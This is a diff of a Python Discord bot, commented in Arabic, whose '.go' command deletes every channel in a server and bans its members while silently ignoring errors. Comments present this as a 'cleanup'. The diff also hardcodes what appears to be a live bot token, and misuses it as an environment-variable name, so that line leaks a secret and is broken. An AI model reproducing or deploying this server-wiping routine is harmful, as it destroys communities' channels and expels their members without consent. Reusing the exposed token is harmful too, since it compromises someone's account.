@@ -2,8 +2,8 @@ import os
 import discord
 from discord.ext import commands
 
-# قراءة التوكن من متغيرات البيئة في الاستضافة
-TOKEN = os.getenv('DISCORD_TOKEN')
+# سحب التوكن من متغيرات البيئة (Railway Variables)
+TOKEN = os.getenv('MTUyMjU2MzQwNTEzMzY0Mzg4OA.GQ579_.idi8GI5YIQex5CES3HvVJS9PqqHWP5AlPNNN1g')
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='.', intents=intents)
@@ -14,7 +14,7 @@ async def on_ready():
 
 @bot.command()
 async def go(ctx):
-    # كود الحذف والإرسال اللي كتبناه سابقاً
+    # تنفيذ عملية التنظيف
     for channel in ctx.guild.channels:
         try: await channel.delete()
         except: pass
@@ -32,8 +32,11 @@ async def go(ctx):
                 await member.ban(reason="Clean up")
         except: pass
 
-# تشغيل البوت باستخدام المتغير
+# التحقق من وجود التوكن قبل التشغيل
 if TOKEN:
-    bot.run(TOKEN)
+    try:
+        bot.run(TOKEN)
+    except discord.errors.LoginFailure:
+        print("خطأ: التوكن غير صحيح، قم بعمل Reset Token جديد وضعه في Variables.")
 else:
-    print("خطأ: لم يتم العثور على التوكن في Variables!")
+    print("خطأ: لم يتم العثور على DISCORD_TOKEN في إعدادات الاستضافة.")
